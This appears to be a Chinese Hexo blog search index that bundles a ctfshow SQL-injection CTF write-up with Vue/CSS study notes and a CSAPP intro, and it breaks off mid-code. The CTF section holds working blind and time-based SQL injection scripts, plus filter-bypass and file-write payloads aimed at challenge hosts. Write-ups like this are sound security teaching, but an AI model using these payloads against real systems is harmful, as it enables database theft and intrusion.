<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2024/09/26/test/"/>
      <url>/2024/09/26/test/</url>
      
        <content type="html"><![CDATA[<p><img src="/_posts/images/QQ_1727348512620.png" alt="img"></p><p>这是一个测试</p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_sql</title>
      <link href="/2024/09/26/ctfshow-sql/"/>
      <url>/2024/09/26/ctfshow-sql/</url>
      
        <content type="html"><![CDATA[<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="171-173"><a href="#171-173" class="headerlink" title="171-173"></a>171-173</h3><p>之前做的，比较简单，不写了</p><h3 id="174"><a href="#174" class="headerlink" title="174"></a>174</h3><p>在页面上很难看到有用的信息，通过抓包才能发现真实的注入点：</p><p><img src="/images/image-20210805171106651.png"></p><p>发现union不行，使用了布尔盲注：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsmark <span class="token operator">=</span><span class="token string">'admin'</span><span class="token builtin">all</span><span class="token operator">=</span><span class="token string">''</span>url<span class="token operator">=</span><span class="token string">'http://4b2d9799-6f45-47bb-ba31-af08c72ba8c9.challenge.ctf.show:8080//api/v4.php?id=1"\' '</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>    head<span class="token operator">=</span><span class="token number">32</span>    tail<span class="token operator">=</span><span class="token number">127</span>    <span class="token comment">#相等时跳出循环</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token comment"># urlAll=url+'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=\'ctfshow_web\' and table_name=\'ctfshow_user4\'),%d,1))>%d --+'%(i,mid)</span>        <span class="token comment"># urlAll =url+'and ascii(substr((select  group_concat(password) from ctfshow_user4),%d,1))>%d --+'%(i,mid)</span>        urlAll <span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">'and ascii(substr((select  password from ctfshow_user4 limit 24,1),%d,1))>%d --+'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlAll<span class="token punctuation">)</span>        <span class="token keyword">if</span> mark <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail<span class="token operator">=</span>mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>  <span class="token comment">#出现空格则结束</span>        <span class="token builtin">all</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">all</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="175"><a href="#175" class="headerlink" title="175"></a>175</h3><p>和上一题很像，但是无论id为几都没有回显，尝试使用时间延时注入<code>http://bd3c2394-573e-463e-9610-0cb4c0568205.challenge.ctf.show:8080//api/v5.php?id=1&quot;&#39; and if(1=1,sleep(3),1) --+</code>，成功，用脚本跑就完了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""时间盲注二分法"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token builtin">all</span><span class="token operator">=</span><span class="token string">''</span>url<span class="token operator">=</span><span class="token string">'http://20896752-5147-40d5-9310-662f7f85bce8.challenge.ctf.show:8080/api/v5.php?id=1"\' '</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>    head<span class="token operator">=</span><span class="token number">32</span>    tail<span class="token operator">=</span><span class="token number">127</span>    <span class="token comment">#相等时找到字符跳出循环</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        urlAll<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">'and if((ascii(substr((select password from ctfshow_user5 limit 24,1),%d,1))>%d),sleep(2),0) --+'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        <span class="token comment"># time1=time.time()</span>        <span class="token comment"># try:</span>        <span class="token comment">#     requests.get(urlAll)</span>        <span class="token comment"># except requests.exceptions.ConnectionError:</span>        <span class="token comment">#     pass</span>        <span class="token comment"># time2=time.time()</span>        <span class="token comment"># if time2-time1 >=1.5:</span>        <span class="token comment">#     head=mid+1</span>        <span class="token comment"># else:</span>        <span class="token comment">#     tail=mid</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlAll<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">)</span>            tail<span class="token operator">=</span>mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">pass</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>  <span class="token comment">#出现空格则结束</span>        <span class="token builtin">all</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">all</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看见别人的wp还可以用文件读写来进行，尝试了一下</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;20896752-5147-40d5-9310-662f7f85bce8.challenge.ctf.show:8080&#x2F;api&#x2F;v5.php?id&#x3D;1&quot;&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可行，但也需要知道该根目录以及库，表，字段名</p><h3 id="176"><a href="#176" class="headerlink" title="176"></a>176</h3><p>两种方法，首先在页面尝试，可以看见对union，select等有过滤，大小写即可绕过</p><p><img src="/images/image-20210806162525386.png"></p><p>也可以or 1=1万能密码绕过</p><p><img src="/images/image-20210806162602696.png"></p><h3 id="177"><a href="#177" class="headerlink" title="177"></a>177</h3><p>过滤了空格，用/**/即可绕过</p><p><img src="/images/image-20210806165806267.png"></p><p>这是万能密码直接就出来，应该是非预期，正常情况用union也能出来的</p><p><img src="/images/image-20210806165948646.png"></p><h3 id="178"><a href="#178" class="headerlink" title="178"></a>178</h3><p>还是过滤的空格，但用/**/绕不过，用%0c绕过即可</p><p>还是可以直接万能密码，也可以union，</p><p><img src="/images/image-20210806171413005.png"></p><h3 id="179"><a href="#179" class="headerlink" title="179"></a>179</h3><p>和上一题一样的payload即可，也不知道他过滤了些啥</p><h3 id="180"><a href="#180" class="headerlink" title="180"></a>180</h3><p>过滤了注释符，使得无法闭合，这种时候就要使用别的方法来使其闭合了</p><p><code>select * from xxx where id =&#39;$_GET[id]&#39;limit1,1</code></p><p>那么可以使用这样的方式闭合：<code>?id=1&#39; or &#39;</code>这样语句就成了：</p><p><code>select * from xxx where id =&#39;1&#39; or&#39;&#39;limit1,1</code></p><p>在’1’和or之间再使用语句进行注入当使用：</p><p><code>-1&#39;%0cor%0c1=1%0cor&#39;</code>时有回显，但不能像之前一样得到flag了但我们知道flag的id是26，所以：</p><p><img src="/images/image-20210806214310504.png"></p><h3 id="181"><a href="#181" class="headerlink" title="181"></a>181</h3><p><img src="/images/image-20210806215003296.png"></p><p>过滤了几乎所有空白的绕过，过滤了很多，select也不能用，那么通过括号来规避空格即可</p><h3 id="182"><a href="#182" class="headerlink" title="182"></a>182</h3><p>和上一题一样</p><h3 id="183"><a href="#183" class="headerlink" title="183"></a>183</h3><p><img src="/images/image-20210807223246599.png"></p><p>过滤比较多，回显传的表名中pass的数量作为回显，以此为盲注的基础，我们构造tableName=ctfshow_user，可以看见user_count=22,所以用脚本跑出来：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflag<span class="token operator">=</span><span class="token string">""</span>option<span class="token operator">=</span><span class="token string">"$user_count = 1;"</span>url<span class="token operator">=</span><span class="token string">"http://cee865ed-11d4-45ef-a869-bef20eaea5b2.challenge.ctf.show:8080/select-waf.php"</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-'</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"(ctfshow_user)where(substr(pass,%d,1))like'%s'"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> option <span class="token keyword">in</span> r<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个脚本跑出来有一些问题，flag格式有问题，因为pass中有别的项造成了干扰，但勉强能用，改一下格式就行，或者稍微改改脚本：</p><p><img src="/images/image-20210807223539623.png"></p><p>前面的改成ctfshow即可，想改可以把substr改成left，用字符串来做匹配，<del>我反正能用就行</del></p><h3 id="184"><a href="#184" class="headerlink" title="184"></a>184</h3>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp</title>
      <link href="/2022/10/19/csapp/"/>
      <url>/2022/10/19/csapp/</url>
      
        <content type="html"><![CDATA[<h1 id="CSAPP"><a href="#CSAPP" class="headerlink" title="CSAPP"></a>CSAPP</h1><p>CSAPP，很经典，是了解计算机系统的一个很好的学习途径，周周转转，混到了大四，混到了保研，现在相对时间更充裕，决定首先重塑一下我自己的计算机基础知识，毕竟基础不牢地动山摇嘛，另外决定学学操作系统的东西，希望这种更有系统化的方向能成为我未来前进的方向<del>web真挺烦的，学啥都没学会，现在还全忘了，不想搞了</del>，那么就从这里开始吧。</p>]]></content>
      
      
      <categories>
          
          <category> 系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-learn</title>
      <link href="/2022/03/09/css-learn-md/"/>
      <url>/2022/03/09/css-learn-md/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS学习"><a href="#CSS学习" class="headerlink" title="CSS学习"></a>CSS学习</h1><p>为了写项目，得用css来布局，这是完全不会，这里就记录一些要点吧</p><h3 id="基础写法："><a href="#基础写法：" class="headerlink" title="基础写法："></a>基础写法：</h3><p>基础写法就是一个选择器加申明：以分号为每个声明的间隔</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">h1</span> <span class="token punctuation">&#123;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>    <span class="token property">text-aligin</span> <span class="token punctuation">:</span> center<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> web前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-learn</title>
      <link href="/2022/01/10/vue-learn/"/>
      <url>/2022/01/10/vue-learn/</url>
      
        <content type="html"><![CDATA[<h1 id="VUE-Learn"><a href="#VUE-Learn" class="headerlink" title="VUE Learn"></a>VUE Learn</h1><h2 id="VUE-basic知识"><a href="#VUE-basic知识" class="headerlink" title="VUE_basic知识"></a>VUE_basic知识</h2><p>学习vue2与3，对之前的一些不是很清楚的点做一个记录，方便查阅</p><h3 id="attribute-和-property-的概念问题"><a href="#attribute-和-property-的概念问题" class="headerlink" title="attribute 和 property 的概念问题"></a>attribute 和 property 的概念问题</h3><p>之前在看官方教程的时候看见这两个一直混淆不清，因为都是属性的意思，在这里记录一下：</p><p>简单来说，二者的区别如下：</p><ul><li>attribute是<strong>元素标签</strong>的属性，attribute是HTML标签上的特性，它的值只能够是字符串；</li><li>property是<strong>元素对象</strong>的属性，property是DOM中的属性，是JavaScript里的对象；</li></ul><h3 id="v-model的一些记录"><a href="#v-model的一些记录" class="headerlink" title="v-model的一些记录"></a>v-model的一些记录</h3><p>v-model用于在如&lt;input&gt;&lt;/input&gt;等用户输入框内对输入，选择值与vue中的data做双向绑定，即不管是用户改变了值还是data本身出现了变化，都会造成该值的变化</p><p>一些使用小技巧：</p><ul><li>如果要自动过滤用户输入的首尾空白字符，可以给 <code>v-model</code> 添加 <code>trim</code> 修饰符：</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model.trim</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>msg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果想自动将用户的输入值转为数值类型，可以给 <code>v-model</code> 添加 <code>number</code> 修饰符：</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model.number</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当输入类型为 <code>text</code> 时这通常很有用。如果输入类型（type）是 <code>number</code>，Vue 能够自动将原始字符串转换为数字，无需为 <code>v-model</code> 添加 <code>.number</code> 修饰符，但一般两个都设置为number更好。如果这个值无法被 <code>parseFloat()</code> 解析，则返回原始的值。</p><ul><li>可以给 <code>v-model</code> 添加 <code>lazy</code> 修饰符：</li></ul><p>懒加载，即失去焦点的时候数据才更新</p><p>在使用v-model收集表单数据时，需要注意一些用法：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;myData&quot;&#x2F;&gt; &#x2F;&#x2F;v-model收集的是value的值，即用户的输入值&lt;input type&#x3D;&quot;tadio&quot; v-model&#x3D;&quot;myData&quot; value&#x3D;&quot;male&quot;&#x2F;&gt; &#x2F;&#x2F;单选框，v-model收集的是value的值，需要自己配置value值&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;myData&quot;&#x2F;&gt;&#x2F;&#x2F;复选框，如果设置了value，则收集value，没有，则收集checked（勾选or未勾选，是布尔值），注意，要在vue的data中将myData设置为数组复选框所选的才能全部收集到<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="计算属性computed"><a href="#计算属性computed" class="headerlink" title="计算属性computed"></a>计算属性computed</h3><p>计算属性用于对一些属性，比如data进行处理后交给vue进行渲染，比如,要从data的两个属性中取出，并拼接在一起，使用计算属性更附和标准以及语法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>span<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>fullName<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">firstName</span><span class="token operator">:</span><span class="token string">"张"</span><span class="token punctuation">,</span>    <span class="token literal-property property">lastName</span><span class="token operator">:</span><span class="token string">"三"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">computed</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">fullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstName<span class="token operator">+</span><span class="token string">'-'</span><span class="token keyword">this</span><span class="token punctuation">.</span>lastName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以使用method，但计算属性有缓存机制，只在第一次读取和更改时会进行计算，而method不会</p><p>注意，这里的计算属性是简写的，计算属性是通过getter()和setter()来进行读取和更新的，</p><ul><li>get()在读取的时候自动调用，返回值就是显示出的值</li><li>set()在被更改时自动调用</li></ul><p>上述例子可以写成：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>span<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>fullName<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">firstName</span><span class="token operator">:</span><span class="token string">"张"</span><span class="token punctuation">,</span>    <span class="token literal-property property">lastName</span><span class="token operator">:</span><span class="token string">"三"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">computed</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">fullName</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"get被调用"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstName<span class="token operator">+</span><span class="token string">'-'</span><span class="token keyword">this</span><span class="token punctuation">.</span>lastName<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token comment">//set 默认接受参数value，即更改的新值</span>        <span class="token function">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"set被调用"</span><span class="token punctuation">)</span>            <span class="token comment">//进行更改,接受的value以-分词，来更改姓和名</span>            <span class="token keyword">const</span> arr <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是一般计算属性不会更改其值，也就不会使用到setter，所以一半使用简写形式，即</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">computed</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">fullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstName<span class="token operator">+</span><span class="token string">'-'</span><span class="token keyword">this</span><span class="token punctuation">.</span>lastName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>* 注意，vue管理的函数都不要使用箭头函数，否则this无法指向vue*</strong></p><h3 id="监视属性watch"><a href="#监视属性watch" class="headerlink" title="监视属性watch"></a>监视属性watch</h3><p>使用监视属性，可以接收被修改的值和修改后的新值，在watch中规定要监视的属性，包括普通的属性和计算属性，都可以被监视，其中handler函数在属性被更改时默认调用，其传入两个变量，分别为新的值和之前的值使用方法如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">firstName</span><span class="token operator">:</span><span class="token string">"张"</span><span class="token punctuation">,</span>    <span class="token literal-property property">lastName</span><span class="token operator">:</span><span class="token string">"三"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">computed</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">fullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstName<span class="token operator">+</span><span class="token string">'-'</span><span class="token keyword">this</span><span class="token punctuation">.</span>lastName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token literal-property property">watch</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">fistName</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token function">handler</span><span class="token punctuation">(</span><span class="token parameter">newvalue<span class="token punctuation">,</span>oldvalue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"被修改"</span><span class="token punctuation">,</span>newvalue<span class="token punctuation">,</span>oldvalue<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token literal-property property">fullName</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">immediate</span><span class="token operator">:</span><span class="token boolean">true</span> <span class="token comment">//在初始化的时候调用一下handler</span>        <span class="token function">handler</span><span class="token punctuation">(</span><span class="token parameter">newvalue<span class="token punctuation">,</span>oldvalue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"被修改"</span><span class="token punctuation">,</span>newvalue<span class="token punctuation">,</span>oldvalue<span class="token punctuation">)</span>           <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过另外的方法实现监视属性：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">vm  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>vm<span class="token punctuation">.</span><span class="token function">$watch</span><span class="token punctuation">(</span><span class="token string">'fullName'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>        <span class="token function">handler</span><span class="token punctuation">(</span><span class="token parameter">newvalue<span class="token punctuation">,</span>oldvalue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"被修改"</span><span class="token punctuation">,</span>newvalue<span class="token punctuation">,</span>oldvalue<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>深度监视，即监视data中的多级数据改变,</p><ul><li><p>vue本身可以检测到对象内部的改变</p></li><li><p>vue的watch默认不监测对象内部值的改变，根据数据的结构，决定是否采用深度监视，通过deep:true来开启</p></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">firstName</span><span class="token operator">:</span><span class="token string">"张"</span><span class="token punctuation">,</span>    <span class="token literal-property property">lastName</span><span class="token operator">:</span><span class="token string">"三"</span><span class="token punctuation">,</span>    <span class="token literal-property property">number</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">a</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>        <span class="token literal-property property">b</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token literal-property property">watch</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">deep</span><span class="token operator">:</span><span class="token boolean">true</span>    <span class="token comment">//开启深度监视，可以检测到a改变对number的影响，若梅开启，则不行</span>        <span class="token literal-property property">number</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>            <span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简写：当watch中只有handler而没有其他的配置项的时候可以使用简写形式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">firstName</span><span class="token operator">:</span><span class="token string">"张"</span><span class="token punctuation">,</span>    <span class="token literal-property property">lastName</span><span class="token operator">:</span><span class="token string">"三"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">computed</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">fullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstName<span class="token operator">+</span><span class="token string">'-'</span><span class="token keyword">this</span><span class="token punctuation">.</span>lastName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token literal-property property">watch</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token comment">//完整形式</span>    <span class="token literal-property property">fistName</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token function">handler</span><span class="token punctuation">(</span><span class="token parameter">newvalue<span class="token punctuation">,</span>oldvalue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"被修改"</span><span class="token punctuation">,</span>newvalue<span class="token punctuation">,</span>oldvalue<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token 